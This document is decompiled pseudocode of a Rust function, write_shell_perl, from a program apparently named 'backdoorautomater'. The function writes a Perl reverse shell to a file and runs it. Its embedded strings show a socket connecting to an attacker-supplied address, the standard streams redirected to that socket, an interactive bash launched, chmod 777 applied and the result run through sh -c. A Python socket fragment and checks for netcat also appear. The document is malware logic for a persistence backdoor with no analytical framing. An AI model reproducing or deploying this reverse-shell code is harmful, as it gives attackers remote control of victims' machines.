
  char const (**)[0x94] backdoorautomater::cronshell::write_shell_perl::h0bdfc4dbe4ec353d(int64_t* arg1, int64_t* arg2, int64_t* arg3)

{
    int32_t var_130;
    std::fs::File::create::he97042899d0016f9(&var_130, arg3);
    char const (** result)[0x94];
    
    if (!var_130)
    {
        int32_t fd_1;
        int32_t fd = fd_1;
        char const (** result_2)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
            "use Socket;\n$p=socket(S,PF_INET…", 0xc);
        result = result_2;
        
        if (result_2)
            goto label_46313f;
        
        var_130 = "$i='kindNoneSomeZeroIpv4Ipv6info…";
        int64_t var_128 = 4;
        int128_t var_120_1 = *(arg2 + 8);
        int128_t var_1a8;
        alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a8, &var_130, 2, 1, 0);
        int128_t var_1e8 = var_1a8;
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_1e8, 
            "';\nimport socket,subprocess,os;…", 3);
        uint64_t var_198;
        char const (** result_3)[0x94] =
            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_1e8[8], var_198);
        result = result_3;
        
        if (result_3)
            goto label_463136;
        
        var_130 = "$p=socket(S,PF_INET,SOCK_STREAM,…";
        int64_t var_128_1 = 3;
        int128_t var_120_2 = *(arg1 + 8);
        alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a8, &var_130, 2, 1, 0);
        int128_t var_1c8 = var_1a8;
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_1c8, 
            ";\nuse Socket;\n$p=socket(S,PF_I…", 2);
        char const (** result_4)[0x94] =
            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_1c8[8], var_198);
        result = result_4;
        
        if (result_4)
        {
            label_46312c:
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1c8);
            label_463136:
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1e8);
            label_46313f:
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
        }
        else
        {
            char const (** result_5)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "socket(S,PF_INET,SOCK_STREAM,get…", 0x35);
            result = result_5;
            
            if (result_5)
                goto label_46312c;
            
            char const (** result_6)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "if(connect(S,sockaddr_in($p,inet…", 0x2e);
            result = result_6;
            
            if (result_6)
                goto label_46312c;
            
            char const (** result_7)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "open(STDIN,'>&S');\nopen(STDOUT,…", 0x13);
            result = result_7;
            
            if (result_7)
                goto label_46312c;
            
            char const (** result_8)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "open(STDOUT,'>&S');\nopen(STDERR…", 0x14);
            result = result_8;
            
            if (result_8)
                goto label_46312c;
            
            char const (** result_9)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "open(STDERR,'>&S');\nexec('/usr/…", 0x14);
            result = result_9;
            
            if (result_9)
                goto label_46312c;
            
            char const (** result_10)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "exec('/usr/bin/bash -i');\n};\n"…", 0x1a);
            result = result_10;
            
            if (result_10)
                goto label_46312c;
            
            char const (** result_11)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "};\n"\n\n\nls /bin/ncls /bin/usr…", 3);
            result = result_11;
            
            if (result_11)
                goto label_46312c;
            
            int64_t zmm0_5 = *(arg3 + 8);
            var_130 = "chmod 777 ;\nuse Socket;\n$p=soc…";
            int64_t var_128_2 = 0xa;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a8, &var_130, 2, 1, 0);
            int128_t zmm0_6 = var_1a8;
            std::process::Command::new::hc59b10cf3f1b2ada(&var_130, 
                "sh-cFailed to execute command*/c…");
            int64_t rbp;
            rbp = 1;
            int64_t* rax_6 = std::process::Command::arg::ha1bca970e684ecbe(&var_130, 
                "-cFailed to execute command*/cro…");
            uint64_t var_198_1 = var_198;
            var_1a8 = zmm0_6;
            std::process::Command::arg::hc1c88ee68029addc(rax_6, &var_1a8);
            std::process::Command::output::hf2f7777b705db8a9(&var_1a8);
            void var_60;
            core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_60, &var_1a8);
            core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_130);
            int64_t var_40;
            size_t var_38;
            alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_1a8, var_40, var_38);
            int64_t rax_7;
            uint64_t rdx_6;
            rax_7 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_1a8);
            _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                &var_130, rax_7, rdx_6);
            int64_t var_138_1 = zmm0_5;
            int128_t var_148 = var_130;
            core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(
                &var_1a8);
            backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_148);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_148);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_60);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1c8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1e8);
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
            result = nullptr;
        }
    }
    else
    {
        char const (** result_1)[0x94];
        result = result_1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    return result;
}
